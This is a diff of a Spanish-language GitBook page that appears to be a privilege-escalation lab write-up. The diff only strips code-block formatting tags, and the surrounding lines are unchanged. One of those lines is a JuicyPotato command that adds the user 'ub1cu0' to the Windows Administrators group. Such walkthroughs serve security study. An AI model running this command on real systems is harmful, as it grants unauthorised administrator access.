@@ -108,13 +108,9 @@ Ahora intentamos crearnos un usuario usando esta herramienta.
 
 Ahora que nos ha funcionado vamos a intentar moverlo al grupo Administradores.
 
-{% code overflow="wrap" %}
-
-```powershell
+```
 JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators ub1cu0 /add" -l 1337
 ```
-
-{% endcode %}
 
 <figure><img src="https://3021530757-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fi2UzPPwLQcMVfFsR8VSd%2Fuploads%2FDJrcqXPL3IOSiShuoFQA%2Fimage.png?alt=media&#x26;token=520bfd6f-18e7-41bb-8b21-f735644f1d31" alt=""><figcaption></figcaption></figure>
 
